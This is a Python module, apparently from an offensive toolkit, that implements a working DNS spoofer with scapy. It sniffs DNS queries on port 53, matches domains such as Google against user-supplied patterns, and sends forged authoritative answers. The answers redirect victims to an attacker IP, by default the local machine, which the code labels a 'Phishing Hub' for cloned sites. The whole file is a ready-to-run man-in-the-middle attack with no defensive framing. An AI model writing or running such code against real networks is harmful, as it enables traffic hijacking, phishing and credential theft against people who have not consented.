import re
from scapy.all import IP, UDP, DNS, DNSRR, DNSQR, send, sniff
from rich.console import Console
from core.ui import show_briefing

console = Console()
SPOOF_MAP = {}


def dns_spoofer_callback(packet):
    if packet.haslayer(DNSQR):
        qname = packet[DNSQR].qname.decode().strip('.')
        for pattern, redirect_ip in SPOOF_MAP.items():
            if re.search(pattern, qname, re.IGNORECASE):
                spoofed_pkt = (
                    IP(dst=packet[IP].src, src=packet[IP].dst) /
                    UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /
                    DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                        an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=redirect_ip))
                )
                send(spoofed_pkt, verbose=False, count=1)
                console.print(
                    f"[bold red][!] DNS HIJACK:[/bold red] {qname} -> {redirect_ip}")


def start_dns_spoof():
    show_briefing("DNS Spoofer: Phishing Hub",
                  "Redirects traffic to local clones.", ["MITM Required"])

    # Get local IP automatically for easier phishing
    import socket
    local_ip = socket.gethostbyname(socket.gethostname())

    console.print(f"[dim]Auto-Phish IP detected: {local_ip}[/dim]")

    while True:
        domain = console.input(
            "[bold cyan]Domain Pattern (e.g. .*google.com) or 'done': [/bold cyan]")
        if domain.lower() == 'done':
            break
        target = console.input(
            f"Redirect IP [Default {local_ip}]: ") or local_ip
        SPOOF_MAP[domain] = target

    if SPOOF_MAP:
        console.print("[*] Sniffing for DNS queries...")
        try:
            sniff(filter="udp port 53", prn=dns_spoofer_callback, store=0)
        except KeyboardInterrupt:
            pass
